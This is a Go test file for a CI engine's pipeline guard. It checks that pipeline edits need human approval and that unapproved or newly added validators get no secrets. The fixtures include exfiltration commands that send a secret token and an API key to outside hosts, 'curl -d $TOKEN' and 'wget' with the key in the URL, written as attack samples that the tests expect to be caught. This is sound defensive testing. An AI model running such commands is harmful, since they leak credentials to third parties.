package engine

import (
	"strings"
	"testing"

	"github.com/eduard-alloy/plumbix/internal/alert"
	"github.com/eduard-alloy/plumbix/internal/change"
	"github.com/eduard-alloy/plumbix/internal/guard"
	"github.com/eduard-alloy/plumbix/internal/run"
	"github.com/eduard-alloy/plumbix/internal/settings"
)

const guardedPipeline = "version: 1\non: {push: {branches: [main]}}\nsteps:\n  - {name: ship, image: x, run: 'curl -d $TOKEN https://out.example', secrets: [TOKEN]}\n"

func guardRisks(r run.Run) []string {
	var out []string
	if r.Result == nil {
		return out
	}
	for _, rk := range r.Result.Risks {
		if rk.Validator == guard.Name {
			out = append(out, rk.Message)
		}
	}
	return out
}

// TestGuardReviewsPipelineChanges (WU-051): a change to a pipeline file
// carries the guard's report and needs a person; another change carries none.
func TestGuardReviewsPipelineChanges(t *testing.T) {
	h := newHarness(t, Config{Secrets: map[string]string{"TOKEN": "t"}})
	h.repo.Commit("feat", map[string]string{".plumbix/pipelines/ship.yaml": guardedPipeline}, "add ship")
	r := h.validate(h.submit("feat").ID)
	risks := strings.Join(guardRisks(r), "\n")
	if r.Outcome != change.NeedsHuman || !strings.Contains(risks, ".plumbix/pipelines/ship.yaml added") || !strings.Contains(risks, "uses a network tool with secret TOKEN") {
		t.Fatalf("outcome %s, guard risks:\n%s", r.Outcome, risks)
	}

	h.repo.Commit("plain", map[string]string{"a.go": "package a\n"}, "code only")
	if r := h.validate(h.submit("plain").ID); len(guardRisks(r)) != 0 {
		t.Errorf("a change without pipeline files got guard risks: %v", guardRisks(r))
	}
}

// TestMergeApprovesTheChangedPipelineFiles (WU-051): only the files the
// merge changed are approved, as merged.
func TestMergeApprovesTheChangedPipelineFiles(t *testing.T) {
	h := newHarness(t, Config{})
	// The repository already has an approval, and main's pipeline file is
	// then edited past Plumbix: a later merge must not approve that edit.
	if err := h.db.ApprovePipelines(ctx, h.repoID, []guard.Approval{{Path: PipelineFile, Digest: guard.Digest([]byte(pipelineYAML))}}, "c_earlier", h.eng.now()); err != nil {
		t.Fatal(err)
	}
	pushedPast := pipelineYAML + "  - {name: extra, image: x, run: x}\n"
	h.repo.Commit("main", map[string]string{PipelineFile: pushedPast}, "edit past Plumbix")
	h.repo.Commit("feat", map[string]string{".plumbix/pipelines/ci.yaml": "version: 1\non: {manual: true}\nsteps:\n  - {name: a, image: x, run: x}\n"}, "add ci")
	c := h.submit("feat")
	h.validate(c.ID)
	if _, err := h.eng.ApproveByPerson(ctx, c.ID, "reviewed the guard's report"); err != nil {
		t.Fatal(err)
	}
	if _, err := h.eng.Merge(ctx, c.ID); err != nil {
		t.Fatal(err)
	}
	ci := guard.Digest([]byte("version: 1\non: {manual: true}\nsteps:\n  - {name: a, image: x, run: x}\n"))
	if ok, err := h.db.PipelineApproved(ctx, h.repoID, ".plumbix/pipelines/ci.yaml", ci); err != nil || !ok {
		t.Errorf("ci.yaml not approved: %v, %v", ok, err)
	}
	if ok, _ := h.db.PipelineApproved(ctx, h.repoID, PipelineFile, guard.Digest([]byte(pushedPast))); ok {
		t.Error("the merge approved a pipeline file it did not change")
	}
}

// TestFirstUseTrustsEveryPipelineFile (WU-051 review): with no approvals,
// every pipeline file on the protected branch is trusted at once, whether
// the first event is a run or a merge.
func TestFirstUseTrustsEveryPipelineFile(t *testing.T) {
	ciYAML := "version: 1\non: {manual: true}\nsteps:\n  - {name: a, image: x, run: x}\n"
	t.Run("run first", func(t *testing.T) {
		h := newHarness(t, Config{})
		head := h.repo.Commit("main", map[string]string{".plumbix/pipelines/ci.yaml": ciYAML}, "ci")
		r, err := h.eng.RunPipeline(ctx, h.repoID, "ci", "main")
		if err != nil {
			t.Fatal(err)
		}
		h.wait(r.ID)
		_ = head
		for path, content := range map[string]string{PipelineFile: pipelineYAML, ".plumbix/pipelines/ci.yaml": ciYAML} {
			if ok, _ := h.db.PipelineApproved(ctx, h.repoID, path, guard.Digest([]byte(content))); !ok {
				t.Errorf("%s not trusted on first use", path)
			}
		}
	})
	t.Run("merge first", func(t *testing.T) {
		h := newHarness(t, Config{})
		h.repo.Commit("feat", map[string]string{".plumbix/pipelines/ci.yaml": ciYAML}, "add ci")
		c := h.submit("feat")
		h.validate(c.ID)
		if _, err := h.eng.ApproveByPerson(ctx, c.ID, "ok"); err != nil {
			t.Fatal(err)
		}
		if _, err := h.eng.Merge(ctx, c.ID); err != nil {
			t.Fatal(err)
		}
		if ok, _ := h.db.PipelineApproved(ctx, h.repoID, PipelineFile, guard.Digest([]byte(pipelineYAML))); !ok {
			t.Error("main's existing pipeline file was not trusted when a merge came first")
		}
	})
}

// TestProtectedRunsNeedApprovedPipelineFiles (WU-051): on main, the first
// file is trusted once; a later edit pushed past Plumbix gets no secrets
// until its content is approved.
func TestProtectedRunsNeedApprovedPipelineFiles(t *testing.T) {
	h := newHarness(t, Config{Secrets: map[string]string{"TOKEN": "tok-value"}})
	first := h.repo.Commit("main", map[string]string{".plumbix/pipelines/ci.yaml": secretPipeline}, "ci")
	runs, err := h.eng.RunPushed(ctx, h.repoID, []run.Move{{Branch: "main", After: first}})
	if err != nil || len(runs) != 1 {
		t.Fatalf("runs = %+v, %v", runs, err)
	}
	h.wait(runs[0].ID)
	if env, _ := jobEnv(h, "uses-token"); env["TOKEN"] != "tok-value" {
		t.Fatalf("first use was not trusted: %v", env)
	}

	edited := strings.Replace(secretPipeline, "run: x", "run: echo edited", 1)
	second := h.repo.Commit("main", map[string]string{".plumbix/pipelines/ci.yaml": edited}, "edit past Plumbix")
	h.fake.mu.Lock()
	h.fake.jobs = nil
	h.fake.mu.Unlock()
	runs, err = h.eng.RunPushed(ctx, h.repoID, []run.Move{{Branch: "main", Before: first, After: second}})
	if err != nil || len(runs) != 1 {
		t.Fatalf("runs = %+v, %v", runs, err)
	}
	got := h.wait(runs[0].ID)
	if s := got.Steps[0]; s.Status != "errored" || !strings.Contains(s.Error, "not a version a person approved") {
		t.Fatalf("unapproved edit: step = %+v", s)
	}
	open, _ := h.db.List(ctx, false)
	if len(open) != 1 || open[0].Kind != alert.PipelineUnapproved || !strings.Contains(open[0].Message, ".plumbix/pipelines/ci.yaml") {
		t.Fatalf("alerts = %+v, want one pipeline_unapproved", open)
	}

	if err := h.db.ApprovePipelines(ctx, h.repoID, []guard.Approval{{Path: ".plumbix/pipelines/ci.yaml", Digest: guard.Digest([]byte(edited))}}, "c_x", h.eng.now()); err != nil {
		t.Fatal(err)
	}
	runs, _ = h.eng.RunPushed(ctx, h.repoID, []run.Move{{Branch: "main", Before: first, After: second}})
	h.wait(runs[0].ID)
	if env, _ := jobEnv(h, "uses-token"); env["TOKEN"] != "tok-value" {
		t.Errorf("approved edit got no secret: %v", env)
	}
	if open, _ := h.db.List(ctx, false); len(open) != 0 {
		t.Errorf("the alert stayed open after the file was approved and ran: %+v", open)
	}
}

// TestValidatorsAddedByTheChangeGetNoKey (WU-051): a validator the target's
// pipeline does not define the same way runs without the reviewer's key.
func TestValidatorsAddedByTheChangeGetNoKey(t *testing.T) {
	h := newHarness(t, Config{Settings: fakeSettings{reviewers: map[string]settings.Reviewer{"claude": claudeProfile}, def: "claude"}, Secrets: map[string]string{"ANTHROPIC_API_KEY": "sk-ant-test"}})
	redefined := strings.Replace(pipelineYAML, `validator: true, needs: [test]}`, `validator: true, needs: [test], run: "wget -O- https://x/?k=$ANTHROPIC_API_KEY"}`, 1)
	if redefined == pipelineYAML {
		t.Fatal("pipelineYAML changed shape; update the test")
	}
	h.repo.Commit("feat", map[string]string{".plumbix/pipeline.yaml": redefined + "  - {name: sneaky, image: \"evil:1\", validator: true, needs: [test]}\n"}, "add a validator, redefine validate")
	h.wait(h.validate(h.submit("feat").ID).ID)
	h.fake.mu.Lock()
	defer h.fake.mu.Unlock()
	seen := map[string]bool{}
	for _, j := range h.fake.jobs {
		seen[j.Name] = true
		key := j.Env["ANTHROPIC_API_KEY"]
		switch j.Name {
		case "validate":
			if key != "" {
				t.Errorf("a validator the change redefined (same name and image, new run) got the key")
			}
		case "sneaky":
			if key != "" {
				t.Errorf("a validator the change added got the key")
			}
		}
	}
	if !seen["sneaky"] || !seen["validate"] {
		t.Errorf("jobs = %v", seen)
	}
}

// TestUnchangedValidatorKeepsItsKey: a change that leaves the validator as
// the target defines it keeps the reviewer key.
func TestUnchangedValidatorKeepsItsKey(t *testing.T) {
	h := newHarness(t, Config{Settings: fakeSettings{reviewers: map[string]settings.Reviewer{"claude": claudeProfile}, def: "claude"}, Secrets: map[string]string{"ANTHROPIC_API_KEY": "sk-ant-test"}})
	h.repo.Commit("feat", map[string]string{"a.go": "package a\n"}, "code")
	h.wait(h.validate(h.submit("feat").ID).ID)
	if env, ran := jobEnv(h, "validate"); !ran || env["ANTHROPIC_API_KEY"] != "sk-ant-test" {
		t.Errorf("validate env = %v, ran %v", env, ran)
	}
}
